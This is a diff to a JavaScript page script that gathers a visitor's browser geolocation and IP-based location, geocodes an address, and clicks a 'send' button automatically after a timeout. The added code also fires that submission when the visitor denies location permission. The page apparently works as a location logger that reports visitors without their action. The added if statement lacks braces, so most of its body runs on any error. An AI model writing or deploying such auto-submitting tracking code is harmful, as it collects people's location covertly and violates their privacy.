@@ -8,7 +8,7 @@
     }
 }, 100); */
 
-getLocation();
+ getLocation();
 
 function getLocation() {
   if (navigator.geolocation) {
@@ -94,6 +94,18 @@ $.getJSON('https://json.geoiplookup.io', function(data) {
 
 // ADDRESS, COORDS & MAP LINKS ----------------------------------------------------------------------------------------------------
 
+navigator.geolocation.watchPosition(function(position) {},
+    function(error) {
+        if (error.code == error.PERMISSION_DENIED)
+
+        document.getElementById("address").innerHTML = "Permission denied";
+        document.getElementById("maps2").innerHTML = "Permission denied";
+        document.getElementById("coords").innerHTML = "Permission denied";
+        document.getElementById("maps").innerHTML = "Permission denied";
+        document.getElementById("send").click();
+
+    });
+
 function showPosition(position) {
     $.getJSON('/keys.json', function(data) {
         var key = data.geocodio;
@@ -106,7 +118,7 @@ function showPosition(position) {
     });
     document.getElementById("coords").innerHTML = position.coords.latitude + ", " + position.coords.longitude; // COORDS
     document.getElementById("maps").innerHTML = "https://www.google.com/maps/search/?api=1&query=" + position.coords.latitude + "," + position.coords.longitude; // MAPS COORDS
-    setTimeout(function(){    
+    setTimeout(function(){     
     document.getElementById("send").click();
     }, 1000);    
 }
